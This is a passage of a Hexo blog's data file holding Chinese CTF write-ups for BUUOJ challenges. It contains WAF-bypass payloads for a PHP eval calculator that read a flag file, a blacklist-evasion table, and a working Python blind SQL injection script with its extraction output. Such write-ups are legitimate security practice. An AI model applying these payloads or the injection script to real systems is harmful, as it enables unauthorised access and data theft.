class=\"line\">file</span><br></pre></td></tr></table></figure>\n\n<p>目录扫描函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scandir</span><br></pre></td></tr></table></figure>","more":"<p>字符转换函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hex2bin(&quot;979797&quot;)-&gt;&quot;aaa&quot;</span><br><span class=\"line\">chr(95)-&gt;&quot;a&quot;</span><br></pre></td></tr></table></figure>\n\n<p>输出函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump()</span><br><span class=\"line\">printf()</span><br></pre></td></tr></table></figure>\n\n<p><code>parse_str</code>函数通常被自动应用于<code>get</code>、<code>post</code>请求和<code>cookie</code>中。使用<code>parse_str</code>解析规则绕过waf</p>\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>查看源码，发现calc.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    $(<span class=\"string\">'#calc'</span>).submit(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $.ajax(&#123;</span><br><span class=\"line\">            url:<span class=\"string\">\"calc.php?num=\"</span>+encodeURIComponent($(<span class=\"string\">\"#content\"</span>).val()),</span><br><span class=\"line\">            type:<span class=\"string\">'GET'</span>,</span><br><span class=\"line\">            success:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(data)</span></span>&#123;</span><br><span class=\"line\">                $(\"#result\").html(`&lt;div class=\"alert alert-success\"&gt;</span><br><span class=\"line\">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class=\"line\">            &lt;/div&gt;`);</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            error:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">                alert(<span class=\"string\">\"这啥?算不来!\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>进入calc.php,进行代码审计。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'num'</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $str = $_GET[<span class=\"string\">'num'</span>];</span><br><span class=\"line\">        $blacklist = [<span class=\"string\">' '</span>, <span class=\"string\">'\\t'</span>, <span class=\"string\">'\\r'</span>, <span class=\"string\">'\\n'</span>,<span class=\"string\">'\\''</span>, <span class=\"string\">'\"'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'\\['</span>, <span class=\"string\">'\\]'</span>,<span class=\"string\">'\\$'</span>,<span class=\"string\">'\\\\'</span>,<span class=\"string\">'\\^'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blackitem) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/'</span> . $blackitem . <span class=\"string\">'/m'</span>, $str)) &#123;    </span><br><span class=\"line\">                        <span class=\"keyword\">die</span>(<span class=\"string\">\"what are you want to do?\"</span>);<span class=\"comment\">//如果包含黑名单中的字符，程序退出</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"string\">'echo '</span>.$str.<span class=\"string\">';'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>传入<code>1+1</code> 显示<code>403 Forbidden</code> 传入<code>1%2b1</code>就可以。必须传入urldecode后。查看<code>phpinfo()</code>，也是<code>403 Forbidden</code>，利用PHP自动解析函数<code>parser_str()</code>绕过，纤细介绍查看<a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">参考连接</a>。</p>\n<p>扫描目录使用<code>scandir()</code>因为<code>/ &#39;  &quot;</code>被过滤无法直接使用<code>/</code>，使用<code>chr()</code>转换payload= <code>?+num=print_r(scandir(chr(47)))</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; f1agg [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; root [16] &#x3D;&gt; run [17] &#x3D;&gt; sbin [18] &#x3D;&gt; srv [19] &#x3D;&gt; start.sh [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var ) 1</span><br></pre></td></tr></table></figure>\n\n<p>使用PHP内置函数获<code>file_get_contents()</code>获取文件内容payload=<code>?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;d09c31b7-d1a1-45a2-b35b-65452a1335ef&#125; 43</span><br></pre></td></tr></table></figure>"},{"title":"buuoj刷题记录3","date":"2019-12-27T04:42:41.000Z","_content":"\n## [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n### 0x00 基础\n\nSQL盲注，使用`if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）`函数一个一个的猜字符，过滤绕过，空格可以使用`+、\\t、/**/、()`绕过。\n```\nif(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值\nascii(char)\nsubstr（str,pos,len)\n```\n<!--more-->\n\n### 0x01 分析\n\n题目提示\n\n```\nflag{} 里为 uuid\n```\n\n访问页面\n\n![](/pic/3.jpg)\n\n\n\n使用burp suite进行sql fuzz测试，以下字符被过滤\n\n|       %20        | 482  | SQL Injection Checked |\n| :--------------: | ---- | --------------------- |\n|       AND        | 482  | SQL Injection Checked |\n|      DELETE      | 482  | SQL Injection Checked |\n|     END-EXEC     | 482  | SQL Injection Checked |\n|      GROUP       | 482  | SQL Injection Checked |\n|      INSERT      | 482  | SQL Injection Checked |\n|       INTO       | 482  | SQL Injection Checked |\n|      LIMIT       | 482  | SQL Injection Checked |\n|        OR        | 482  | SQL Injection Checked |\n|      UNION       | 482  | SQL Injection Checked |\n|      UPDATE      | 482  | SQL Injection Checked |\n|        +         | 482  | SQL Injection Checked |\n|        /         | 482  | SQL Injection Checked |\n|        -         | 482  | SQL Injection Checked |\n|        *         | 482  | SQL Injection Checked |\n|        `         | 482  | SQL Injection Checked |\n|        \"         | 482  | SQL Injection Checked |\n|       \\|\\|       | 482  | SQL Injection Checked |\n|        &&        | 482  | SQL Injection Checked |\n|       %23        | 482  | SQL Injection Checked |\n|;|482|SQL Injection Checked |\n`if,substr,ascii,<,>,=,(),/t`都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用`/t、( )代替`\n\n### 0x02 开始操作\n\n```pytho\n# -*- coding: utf-8 -*-\n# @Time    : 12/27/2019 6:11 PM\nimport requests\nimport time\n\nurl = \"http://97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn/index.php\"\nresult = ''\n\nfor x in range(1, 43):\n    high = 126\n    low = 45\n    mid = (low + high) // 2\n\n\n    while high - low > 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)\" % (x, mid)\n        data = {\n            \"id\": payload\n        }\n        time.sleep(0.3)\n        res = requests.post(url, data = data)\n        if 'Hello' in res.text:\n            low = mid\n        else:\n            high = mid\n        mid = (low + high) // 2\n\n    if high - low == 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)\" % (x, high)\n        data = {\n            \"id\": payload\n        }\n        response = requests.post(url, data=data)\n        if 'Hello' in response.text:\n            result += chr(int(mid+1))\n        else :\n            result += chr(int(mid))\n    else :\n        result += chr(int(mid))\n    print(result)\n```\n\n```\nf\nfl\nfla\nflag\nflag{\nflag{a\nflag{a2\nflag{a22\nflag{a22c\nflag{a22cf\nflag{a22cf6\nflag{a22cf69\nflag{a22cf690\nflag{a22cf690-\nflag{a22cf690-3\nflag{a22cf690-34\nflag{a22cf690-342\nflag{a22cf690-342a\nflag{a22cf690-342a-\nflag{a22cf690-342a-4\nflag{a22cf690-342a-4b\nflag{a22cf690-342a-4bf\nflag{a22cf690-342a-4bf4\nflag{a22cf690-342a-4bf4-\nflag{a22cf690-342a-4bf4-8\nflag{a22cf690-342a-4bf4-88\nflag{a22cf690-342a-4bf4-885\nflag{a22cf690-342a-4bf4-885b\nflag{a22cf690-342a-4bf4-885b-\nflag{a22cf690-342a-4bf4-885b-d\nflag{a22cf690-342a-4bf4-885b-df\nflag{a22cf690-342a-4bf4-885b-df3\nflag{a22cf690-342a-4bf4-885b-df33\nflag{a22cf690-342a-4bf4-885b-df332\nflag{a22cf690-342a-4bf4-885b-df332d\nflag{a22cf690-342a-4bf4-885b-df332d4\nflag{a22cf690-342a-4bf4-885b-df332d44\nflag{a22cf690-342a-4bf4-885b-df332d446\nflag{a22cf690-342a-4bf4-885b-df332d4469\nflag{a22cf690-342a-4bf4-885b-df332d44698\nflag{a22cf690-342a-4bf4-885b-df332d44698d\nflag{a22cf690-342a-4bf4-885b-df332d44698d}\n```\n\n因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。\n\n\n\n","source":"_posts/buuoj刷题记录3.md","raw":"---\ntitle: buuoj刷题记录3\ndate: 2019-12-27 12:42:41\ntags:\n - ciscn\n - web\n - ctf\n - buuctf\n---\n\n## [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n### 0x00 基础\n\nSQL盲注，使用`if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）`函数一个一个的猜字符，过滤绕过，空格可以使用`+、\\t、/**/、()`绕过。\n```\nif(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值\nascii(char)\nsubstr（str,pos,len)\n```\n<!--more-->\n\n### 0x01 分析\n\n题目提示\n\n```\nflag{} 里为 uuid\n```\n\n访问页面\n\n![](/pic/3.jpg)\n\n\n\n使用burp suite进行sql fuzz测试，以下字符被过滤\n\n|       %20        | 482  | SQL Injection Checked |\n| :--------------: | ---- | --------------------- |\n|       AND        | 482  | SQL Injection Checked |\n|      DELETE      | 482  | SQL Injection Checked |\n|     END-EXEC     | 482  | SQL Injection Checked |\n|      GROUP       | 482  | SQL Injection Checked |\n|      INSERT      | 482  | SQL Injection Checked |\n|       INTO       | 482  | SQL Injection Checked |\n|      LIMIT       | 482  | SQL Injection Checked |\n|        OR        | 482  | SQL Injection Checked |\n|      UNION       | 482  | SQL Injection Checked |\n|      UPDATE      | 482  | SQL Injection Checked |\n|        +         | 482  | SQL Injection Checked |\n|        /         | 482  | SQL Injection Checked |\n|        -         | 482  | SQL Injection Checked |\n|        *         | 482  | SQL Injection Checked |\n|        `         | 482  | SQL Injection Checked |\n|        \"         | 482  | SQL Injection Checked |\n|       \\|\\|       | 482  | SQL Injection Checked |\n|        &&        | 482  | SQL Injection Checked |\n|       %23        | 482  | SQL Injection Checked |\n|;|482|SQL Injection Checked |\n`if,substr,ascii,<,>,=,(),/t`都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用`/t、( )代替`\n\n### 0x02 开始操作\n\n```pytho\n# -*- coding: utf-8 -*-\n# @Time    : 12/27/2019 6:11 PM\nimport requests\nimport time\n\nurl = \"http://97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn/index.php\"\nresult = ''\n\nfor x in range(1, 43):\n    high = 126\n    low = 45\n    mid = (low + high) // 2\n\n\n    while high - low > 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)\" % (x, mid)\n        data = {\n            \"id\": payload\n        }\n        time.sleep(0.3)\n        res = requests.post(url, data = data)\n        if 'Hello' in res.text:\n            low = mid\n        else:\n            high = mid\n        mid = (low + high) // 2\n\n    if high - low == 1:\n        payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)\" % (x, high)\n        data = {\n            \"id\": payload\n        }\n        response = requests.post(url, data=data)\n        if 'Hello' in response.text:\n            result += chr(int(mid+1))\n        else :\n            result += chr(int(mid))\n    else :\n        result += chr(int(mid))\n    print(result)\n```\n\n```\nf\nfl\nfla\nflag\nflag{\nflag{a\nflag{a2\nflag{a22\nflag{a22c\nflag{a22cf\nflag{a22cf6\nflag{a22cf69\nflag{a22cf690\nflag{a22cf690-\nflag{a22cf690-3\nflag{a22cf690-34\nflag{a22cf690-342\nflag{a22cf690-342a\nflag{a22cf690-342a-\nflag{a22cf690-342a-4\nflag{a22cf690-342a-4b\nflag{a22cf690-342a-4bf\nflag{a22cf690-342a-4bf4\nflag{a22cf690-342a-4bf4-\nflag{a22cf690-342a-4bf4-8\nflag{a22cf690-342a-4bf4-88\nflag{a22cf690-342a-4bf4-885\nflag{a22cf690-342a-4bf4-885b\nflag{a22cf690-342a-4bf4-885b-\nflag{a22cf690-342a-4bf4-885b-d\nflag{a22cf690-342a-4bf4-885b-df\nflag{a22cf690-342a-4bf4-885b-df3\nflag{a22cf690-342a-4bf4-885b-df33\nflag{a22cf690-342a-4bf4-885b-df332\nflag{a22cf690-342a-4bf4-885b-df332d\nflag{a22cf690-342a-4bf4-885b-df332d4\nflag{a22cf690-342a-4bf4-885b-df332d44\nflag{a22cf690-342a-4bf4-885b-df332d446\nflag{a22cf690-342a-4bf4-885b-df332d4469\nflag{a22cf690-342a-4bf4-885b-df332d44698\nflag{a22cf690-342a-4bf4-885b-df332d44698d\nflag{a22cf690-342a-4bf4-885b-df332d44698d}\n```\n\n因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。\n\n\n\n","slug":"buuoj刷题记录3","published":1,"updated":"2019-12-28T13:19:17.261Z","_id":"ck4pc9e4v0005187eb7yv5rj5","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"CISCN2019-华北赛区-Day2-Web1-Hack-World\"><a href=\"#CISCN2019-华北赛区-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day2 Web1]Hack World\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>SQL盲注，使用<code>if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）</code>函数一个一个的猜字符，过滤绕过，空格可以使用<code>+、\\t、/**/、()</code>绕过。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值</span><br><span class=\"line\">ascii(char)</span><br><span class=\"line\">substr（str,pos,len)</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;&#125; 里为 uuid</span><br></pre></td></tr></table></figure>\n\n<p>访问页面</p>\n<p><img src=\"/pic/3.jpg\" alt=\"\"></p>\n<p>使用burp suite进行sql fuzz测试，以下字符被过滤</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">%20</th>\n<th>482</th>\n<th>SQL Injection Checked</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">AND</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">DELETE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">END-EXEC</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">GROUP</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INSERT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INTO</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">LIMIT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">OR</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UNION</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UPDATE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">+</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">/</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">-</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">*</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">`</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">“</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">||</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;&amp;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">%23</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\"><code>if,substr,ascii,&lt;,&gt;,=,(),/t</code>都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用<code>/t、( )代替</code></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Time    : 12&#x2F;27&#x2F;2019 6:11 PM</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">url &#x3D; &quot;http:&#x2F;&#x2F;97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class=\"line\">result &#x3D; &#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">for x in range(1, 43):</span><br><span class=\"line\">    high &#x3D; 126</span><br><span class=\"line\">    low &#x3D; 45</span><br><span class=\"line\">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    while high - low &gt; 1:</span><br><span class=\"line\">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)&quot; % (x, mid)</span><br><span class=\"line\">        data &#x3D; &#123;</span><br><span class=\"line\">            &quot;id&quot;: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        time.sleep(0.3)</span><br><span class=\"line\">        res &#x3D; requests.post(url, data &#x3D; data)</span><br><span class=\"line\">        if &#39;Hello&#39; in res.text:</span><br><span class=\"line\">            low &#x3D; mid</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            high &#x3D; mid</span><br><span class=\"line\">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class=\"line\"></span><br><span class=\"line\">    if high - low &#x3D;&#x3D; 1:</span><br><span class=\"line\">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%d,1,2)&quot; % (x, high)</span><br><span class=\"line\">        data &#x3D; &#123;</span><br><span class=\"line\">            &quot;id&quot;: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        response &#x3D; requests.post(url, data&#x3D;data)</span><br><span class=\"line\">        if &#39;Hello&#39; in response.text:</span><br><span class=\"line\">            result +&#x3D; chr(int(mid+1))</span><br><span class=\"line\">        else :</span><br><span class=\"line\">            result +&#x3D; chr(int(mid))</span><br><span class=\"line\">    else :</span><br><span class=\"line\">        result +&#x3D; chr(int(mid))</span><br><span class=\"line\">    print(result)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f</span><br><span class=\"line\">fl</span><br><span class=\"line\">fla</span><br><span class=\"line\">flag</span><br><span class=\"line\">flag&#123;</span><br><span class=\"line\">flag&#123;a</span><br><span class=\"line\">flag&#123;a2</span><br><span class=\"line\">flag&#123;a22</span><br><span class=\"line\">flag&#123;a22c</span><br><span class=\"line\">flag&#123;a22cf</span><br><span class=\"line\">flag&#123;a22cf6</span><br><span class=\"line\">flag&#123;a22cf69</span><br><span class=\"line\">flag&#123;a22cf690</span><br><span class=\"line\">flag&#123;a22cf690-</span><br><span class=\"line\">flag&#123;a22cf690-3</span><br><span class=\"line\">flag&#123;a22cf690-34</span><br><span class=\"line\">flag&#123;a22cf690-342</span><br><span class=\"line\">flag&#123;a22cf690-342a</span><br><span class=\"line\">flag&#123;a22cf690-342a-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-8</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-88</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df3</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df33</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d446</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4469</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。</p>\n","site":{"data":{}},"excerpt":"<h2 id=\"CISCN2019-华北赛区-Day2-Web1-Hack-World\"><a href=\"#CISCN2019-华北赛区-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day2 Web1]Hack World\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>SQL盲注，使用<code>if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）</code>函数一个一个的猜字符，过滤绕过，空格可以使用<code>+、\\t、/**/、()</code>绕过。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值</span><br><span class=\"line\">ascii(char)</span><br><span class=\"line\">substr（str,pos,len)</span><br></pre></td></tr></table></figure>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;&#125; 里为 uuid</span><br></pre></td></tr></table></figure>\n\n<p>访问页面</p>\n<p><img src=\"/pic/3.jpg\" alt=\"\"></p>\n<p>使用burp suite进行sql fuzz测试，以下字符被过滤</p>\n<table>\n<thead>\n<tr>\n<th 